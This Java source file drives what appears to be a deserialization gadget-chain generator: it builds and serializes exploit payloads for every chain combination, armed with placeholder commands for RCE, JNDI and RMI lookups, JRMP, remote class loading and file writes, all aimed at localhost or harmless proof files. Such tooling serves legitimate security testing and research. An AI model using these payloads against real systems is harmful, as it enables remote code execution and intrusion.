package org.ses.gadgetbuilder.client;

import org.ses.gadgetbuilder.adapters.SinkAdapter;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.InstantiateGadgetChain;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;
import org.ses.gadgetbuilder.exceptions.NoSuchChainException;
import org.ses.gadgetbuilder.exceptions.NoSuchTrampolineException;
import org.ses.gadgetbuilder.exceptions.TrampolineMismatchException;
import org.ses.gadgetbuilder.factory.GadgetBuilderFactory;
import org.ses.gadgetbuilder.util.Reflections;
import org.ses.gadgetbuilder.util.Serialization;

import java.io.File;
import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;

public class ChainGenUtil {

    public static String defaultRCECommand = "touch proof.txt";
    public static String defaultJNDICommand = "rmi://localhost:8000/service";
    public static String defaultZeroFileCommand = "proof.txt";
    public static String defaultFileWriteCommand = "proof.txt:cHJvb2Y=";
    public static String defaultRandomFileWriteCommand = "/tmp:cHJvb2Y=";
    public static String defaultURLCommand = "http://localhost:8000";
    public static String defaultSetPropertyCommand = "myprop:myval";
    public static String defaultJRMPListenerCommand = "8000";
    public static String defaultJRMPClientCommand = "localhost:8000";
    public static String defaultClassLoadCommand = "http://localhost:8000:MyClass.class";
    public static String defaultDBConnectionCommand = "localhost:8000/testdb";
    public static String defaultELExpressionCommand = "";
    public static String defaultPythonScriptCommand = "/tmp/jython1.py;/tmp/jython_new.py";


    public static void main(String[] args) throws Exception {

        String outputDir = "gadgetbuilder";

        if (args.length >= 1)
            outputDir = args[0];

        File dir = new File(outputDir);
        if (!dir.exists()) dir.mkdir();




        int payloadCnt = 0;

        for (GadgetChain chain : generateAllGadgetChains()) {

            File chainDir = new File(outputDir + File.separator + chain.getClass().getSimpleName());
            if (!chainDir.exists()) chainDir.mkdir();

            try {
                String outputFileName = chain.getTrampoline().getClass().getSimpleName();
                if (MethodInvokeGadgetChain.class.isAssignableFrom(chain.getClass())) {
                    outputFileName += "_" + ((MethodInvokeGadgetChain) chain).getMethodInvokeAdapter().getClass().getSimpleName();
                } else if (InstantiateGadgetChain.class.isAssignableFrom(chain.getClass())) {
                    outputFileName += "_" +  ((InstantiateGadgetChain) chain).getInitializeAdapter().getClass().getSimpleName();
                }
                outputFileName += ".ser";

                Object payload = armWithCommand(chain);
                try {
                    Serialization.serializeToFile((Serializable) payload, chainDir.getPath() + File.separator + outputFileName);
                    payloadCnt++;
                } catch (Exception e) {
                    System.out.println("Error: " + chain.getClass());
                    e.printStackTrace();
                }

            } catch (AdapterMismatchException e) {
                System.out.println("Skipping: " + chain.getClass().getSimpleName());
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }

        System.out.println("Total payload count: " + payloadCnt);
    }

    public static List<GadgetChain> generateAllGadgetChains() throws InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchChainException, NoSuchTrampolineException, AdapterMismatchException, TrampolineMismatchException {

        List allChains = new ArrayList<GadgetChain>();

        for (Class<? extends GadgetChain> chainClass : GadgetBuilderFactory.getChainImplementations()) {
            GadgetChain dummy = Reflections.createWithoutConstructor(chainClass);
            for (Object trampolineClass : GadgetBuilderFactory.getTrampolineImplementations(dummy.getTrampolineType())) {
                if (dummy.getAdapterType() != null) {
                    for (Object adapterClass : GadgetBuilderFactory.getAdapterImplementations(dummy.getAdapterType())) {
                        allChains.add(GadgetBuilderFactory.buildChain(chainClass, (Class) trampolineClass, (Class) adapterClass));
                    }
                } else {
                    allChains.add(GadgetBuilderFactory.buildChain(chainClass, (Class) trampolineClass, null));
                }
            }
        }
        return allChains;
    }


    public static Object armWithCommand(GadgetChain builtChain) throws Exception {

        String impact = getChainImpact(builtChain);

        switch (impact) {
            case Impact.PythonScript:
                return builtChain.build(defaultPythonScriptCommand);
            case Impact.ELInvocation:
                return builtChain.build(defaultELExpressionCommand);
            case Impact.LoadClass:
                return builtChain.build(defaultClassLoadCommand);
            case Impact.DBConnection:
                return builtChain.build(defaultDBConnectionCommand);
            case Impact.RCE:
                return builtChain.build(defaultRCECommand);
            case Impact.JNDI:
                return builtChain.build(defaultJNDICommand);
            case Impact.ZeroFile:
                return builtChain.build(defaultZeroFileCommand);
            case Impact.FileWrite:
                return builtChain.build(defaultFileWriteCommand);
            case Impact.SSRF:
            case Impact.DNSLookup:
                return builtChain.build(defaultURLCommand);
            case Impact.JRMPClient:
                return builtChain.build(defaultJRMPClientCommand);
            case Impact.JRMPListener:
                return builtChain.build(defaultJRMPListenerCommand);
            case Impact.RandomFileWrite:
                return builtChain.build(defaultRandomFileWriteCommand);
            case Impact.SetProperty:
                return builtChain.build(defaultSetPropertyCommand);

            default:
                System.out.println(builtChain.getClass().getSimpleName());
                System.out.println("Unrecognized Impact " + impact);
        }

        return null;

    }

    private static String getChainImpact(GadgetChain builtChain) {
        String impact = builtChain.getImpact();
        SinkAdapter adapter = null;

        if (MethodInvokeGadgetChain.class.isAssignableFrom(builtChain.getClass())) {
            adapter = ((MethodInvokeGadgetChain) builtChain).getMethodInvokeAdapter();
        } else if (InstantiateGadgetChain.class.isAssignableFrom(builtChain.getClass())) {
            adapter = ((InstantiateGadgetChain) builtChain).getInitializeAdapter();
        }

        if (adapter != null)
            impact = adapter.getImpact();
        return impact;
    }

}
